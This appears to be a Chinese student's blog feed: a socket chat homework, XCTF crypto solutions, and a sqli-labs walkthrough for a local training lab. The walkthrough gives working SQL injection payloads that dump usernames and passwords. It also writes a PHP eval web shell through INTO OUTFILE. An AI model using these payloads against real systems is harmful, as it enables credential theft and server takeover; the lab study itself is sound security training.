<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">         hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest1, LPVOID(sockClient), <span class="number">0</span>, &amp;dwThreadId1);</span><br><span class="line">            ......</span><br><span class="line">        <span class="comment">//主线程检测到cond值为1，则退出程序</span></span><br><span class="line">     	<span class="keyword">if</span> (cond) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭socket连接</span></span><br><span class="line">    closesocket(sockClient);</span><br><span class="line">    <span class="comment">//终止Winsock 2 DLL (Ws2_32.dll) 的使用</span></span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于<strong>server端</strong>，如果需要服务器常开则不需要退出程序，也可以设置为<strong>当所有客户端均断开连接时退出</strong></p>
<p>这里对后者的代码进行展示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> cond;<span class="comment">//全局数据区，初始化为0</span></span><br></pre></td></tr></table></figure>

<p>在accept函数执行成功时，执行<strong>cond++</strong>，当所有客户端都成功连接时，<strong>cond==CLIENTNUM</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//转发函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	......</span><br><span class="line">        <span class="comment">//解析到客户端发来的消息为0</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(m.msg, <span class="string">"quit"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"用户"</span> &lt;&lt; (<span class="keyword">int</span>)lparam &lt;&lt; <span class="string">"退出聊天"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">//已连接数量-1</span></span><br><span class="line">            cond--; <span class="keyword">if</span> (!cond)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (cond == CLIENTNUM)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; CLIENTNUM &lt;&lt; <span class="string">" clients have connected"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		......<span class="comment">//转发</span></span><br><span class="line">        <span class="comment">//当主线程检测到在线人数为0时，退出程序</span></span><br><span class="line">		<span class="keyword">if</span> (!cond)<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">closesocket(sockSer);</span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<h2 id="3-对话界面展示和对话的退出"><a href="#3-对话界面展示和对话的退出" class="headerlink" title="3. 对话界面展示和对话的退出"></a>3. 对话界面展示和对话的退出</h2><ul>
<li>启动一个server程序和两个client程序</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第一次作业/image-20201030153626308.png"  alt="image-20201030153626308" style="zoom: 50%;">

<ul>
<li>0号客户向1号发送消息<code>Hi</code>,server解析到<code>01Hi</code>,目的地址是<code>1</code>,向1号进行转发，1号客户端收到由0发来的消息<code>Hi</code>。并且可以看到程序支持<strong>收发中英文消息</strong></li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第一次作业/image-20201030153940014.png"  alt="image-20201030153940014" style="zoom:50%;">

<ul>
<li>如果0号向0号（自己）发送消息，则server回将收到的消息转发回去，而1号不能收到消息</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第一次作业/image-20201030154052095.png"  alt="image-20201030154052095" style="zoom:60%;">



<ul>
<li>同样，1也可以向0发送消息</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第一次作业/image-20201030154119832.png"  alt="image-20201030154119832" style="zoom:60%;">

<ul>
<li>0号发出退出指定，程序结束，server检测到用户0退出</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第一次作业/image-20201030154134653.png"  alt="image-20201030154134653" style="zoom:50%;">

<ul>
<li>1号发出退出指令，退出程序，server检测到1号退出，这时所有连接都已经断开，sesrver自动退出</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201030154153379.png"  alt="image-20201030154153379"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界crypto题解+crypto脚本整理</title>
    <url>/2020/09/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5109&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5109&amp;page=1</a></p>
<p>base64加密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># str为待加密字符串</span></span><br><span class="line">str=<span class="string">'Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9'</span></span><br><span class="line">str=str.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">str_encode=base64.b64encode(str)</span><br><span class="line">print(str_encode)</span><br></pre></td></tr></table></figure>

<p>base64解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># str为待加密字符串</span></span><br><span class="line">str=<span class="string">'Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9'</span></span><br><span class="line">str=str.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">str_encode=base64.b64decode(str)</span><br><span class="line">print(str_encode)</span><br></pre></td></tr></table></figure>



<h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5110" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5110</a></p>
<p>暴力破解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 凯撒密码</span></span><br><span class="line"><span class="comment"># 常规 暴力破解</span></span><br><span class="line">str=input(<span class="string">'输入待破解字符串：'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span> j.isalpha():</span><br><span class="line">      <span class="keyword">if</span> (ord(j)&gt;=<span class="number">97</span> <span class="keyword">and</span> ord(j)+i&gt;<span class="number">97</span>+<span class="number">25</span>) <span class="keyword">or</span> (ord(j)&lt;<span class="number">97</span> <span class="keyword">and</span> ord(j)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(j)+i&gt;<span class="number">65</span>+<span class="number">25</span>): <span class="comment"># 小写字母</span></span><br><span class="line">          print(chr(ord(j)+i<span class="number">-26</span>),end=<span class="string">''</span>)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          print(chr(ord(j)+i),end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      print(j,end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">  print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5111&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5111&amp;page=1</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">'11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110'</span></span><br><span class="line">str2=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">  <span class="keyword">if</span> i==<span class="string">'1'</span>:</span><br><span class="line">    str2+=<span class="string">'-'</span></span><br><span class="line">  <span class="keyword">elif</span> i==<span class="string">'0'</span>:</span><br><span class="line">    str2+=<span class="string">'.'</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    str2+=i</span><br><span class="line">print(str2)</span><br></pre></td></tr></table></figure>

<p>然后找个在线翻译器</p>
<h1 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5112&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5112&amp;page=1</a></p>
<p>w型栅栏密码</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a></p>
<p>题面：五只小鸡-&gt;五栏</p>
<h1 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h1><p>支持包含斜杠的morse解码：<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
<p>解码后发现有大量AB内容</p>
<p>培根密码</p>
<p><a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/baconian.php</a></p>
<h1 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5118&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5118&amp;page=1</a></p>
]]></content>
  </entry>
  <entry>
    <title>sagemath使用教程</title>
    <url>/2020/09/21/sagemath%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>官网地址：<a href="https://www.sagemath.org/" target="_blank" rel="noopener">https://www.sagemath.org</a></p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli/sqli-labs</title>
    <url>/2020/08/29/sqli/sqli-labs/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>教程参考:</p>
<p><a href="https://blog.csdn.net/he_and/article/details/79979616" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/79979616</a></p>
<p>[<a href="https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1%20GET%20-%20Error%20based%20-%20Single%20quotes%20-%20String(%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)]" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1%20GET%20-%20Error%20based%20-%20Single%20quotes%20-%20String(%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)]</a>(<a href="https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1</a> GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入))</p>
</blockquote>
<p>[TOC]</p>
<h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 Basic Challenges"></a>Page-1 Basic Challenges</h1><h2 id="Less-1-GET-Error-Based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-Based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入"></a>Less-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入</h2><h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145525940.png"  alt="image-20200807145525940" style="zoom:33%;">

<p>要求输入id，在网址上加入?id=1</p>
<p>有反应<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145629437.png"  alt="image-20200807145629437" style="zoom:33%;"></p>
<p>再<font color="green">加单引号，报错</font>，存在注入</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145709029.png"  alt="image-20200807145709029"></p>
<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p><font color="green">单引号可以被解析，通过闭合id参数，插入自己构造的sql语句实施攻击</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1 <span class="comment">##</span></span><br></pre></td></tr></table></figure>

<p>报错，将<code>##</code>改为编码<code>%23</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1 %23</span><br></pre></td></tr></table></figure>

<p>成功显示，尝试，4的时候报错</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807150637111.png"  alt="image-20200807150637111"></p>
<p>说明db只有三个字段</p>
<p>当查询结果为多个时只返回第一个，所以使用union查询且使原结果为空</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>发现2，3被显示在了页面上<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807151552387.png"  alt="image-20200807151552387" style="zoom:53%;"></p>
<p><font color="green">获取当前数据库版本，数据库路径，当前用户，当前数据库</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,<span class="keyword">user</span>(),<span class="keyword">version</span>(),<span class="keyword">database</span>()),@@basedir %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>拿到信息<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807151952682.png"  alt="image-20200807151952682" style="zoom:40%;"></p>
<p><font color="green">表名</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807152305560.png"  alt="image-20200807152305560" style="zoom:50%;">

<p><font color="green">payload</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%20extractvalue(1,concat(0x7e,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h2 id="Less-2-Error-Based-Intiger-基于错误的GET整型注入"><a href="#Less-2-Error-Based-Intiger-基于错误的GET整型注入" class="headerlink" title="Less-2 Error Based - Intiger 基于错误的GET整型注入"></a>Less-2 Error Based - Intiger 基于错误的GET整型注入</h2><p>同Less-1，单引号报错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1</span><br></pre></td></tr></table></figure>

<p>报错，判断是数值型注入</p>
<p>去掉单引号，其余同Less-1</p>
<h2 id="Less-3-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><p>源码 <img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807164139529.png"  alt="image-20200807164139529"></p>
<p>输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' %23</span><br></pre></td></tr></table></figure>

<p>回显失败</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1') %23</span><br></pre></td></tr></table></figure>

<p>成功回显</p>
<h2 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'</span><br></pre></td></tr></table></figure>

<p>成功回显无报错</p>
<p>将单引号改成双引号</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"</span><br></pre></td></tr></table></figure>

<p>报错,显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>仔细观察，是双引号+括号<code>where id=(”1”)</code>\</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1") %23</span><br></pre></td></tr></table></figure>

<p>正常回显</p>
<h2 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h2><p>使用一种的方法发现可以注入，但是页面不能返回我们想要的全部信息</p>
<p>可以采用类似<font color="green">时间盲注</font>的方法（因为页面还是能返回一点点东西）</p>
<p><font color="green">数据库名长度</font>(可以采用二分法)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>有明显延迟，长度为8</p>
<p><font color="green">爆破库名</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>left是提取最左边</p>
<h2 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"</span><br></pre></td></tr></table></figure>
<p>返回错误信息<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807170839602.png"  alt="image-20200807170839602" style="zoom:50%;"></p>
<p>说明是双引号的注入</p>
<p>其余同五</p>
<h2 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h2><p>源码：<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171706714.png"  alt="image-20200807171706714"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171508514.png"  alt="image-20200807171508514"></p>
<p>使用<font color="green">文件导出</font></p>
<p>使用前面的Less查到的路径</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Less-2/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,@@basedir,@@datadir <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171823337.png"  alt="image-20200807171823337" style="zoom:50%;">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php @eval($_POST['sql']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'路径'</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST['</span><span class="keyword">sql</span><span class="string">']);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\1.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>注意必须要使用\\</p>
<p>==我没有导出文件来==</p>
<p>导出来，导出来之后用菜刀或者蚁剑连接</p>
<h2 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id='</span><br></pre></td></tr></table></figure>
<p>不回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1'</span><br></pre></td></tr></table></figure>

<p>不回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and 1=1 %23</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and 1=2 %23</span><br></pre></td></tr></table></figure>
<p>不回显</p>
<p>是布尔型注入</p>
<p>爆破方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and left(database(),1)='s'%23</span><br></pre></td></tr></table></figure>



<h2 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</h2><p>不管输入什么页面都显示一样-&gt;<font color="green">时间盲注</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and sleep(3) %23</span><br></pre></td></tr></table></figure>

<p>明显延迟</p>
<p>爆破方式参看less-5</p>
<h2 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h2><p>把9中的单引号改成双引号</p>
<h2 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h2><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200812203626309.png"  alt="image-20200812203626309" style="zoom:33%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：&#39; or 1&#x3D;1 ##</span><br><span class="line">password: a</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<p>Your Login name:Dumb<br>Your Password:Dumb</p>
<p>使用Dumb登录，成功</p>
<p>使用hackbar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; order by 2## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p>Your Login name:admin<br>Your Password:admin</p>
<p>使用union查询</p>
<p><font color="green">注意，uname是错的，才能显示出union后的内容</font></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;a&#39; union select 1,database() ## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p>Your Login name:1<br>Your Password:security</p>
<p>数据库名security</p>
<h2 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h2><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200812205756771.png"  alt="image-20200812205756771" style="zoom:33%;">

<p>输入<code>‘</code>，无反应，输入<code>&quot;</code></p>
<p>返回</p>
<figure class="highlight plain"><figcaption><span>have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near '""") and  password</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">看下源码</span><br><span class="line"></span><br><span class="line">![img](sqli-labs.assets&#x2F;20180822112455820.png)</span><br><span class="line"></span><br><span class="line">发现还有个括号，构造闭合语句</span><br></pre></td></tr></table></figure>
<p>uname=1”) or 1=1## &amp;passwd=1</p>
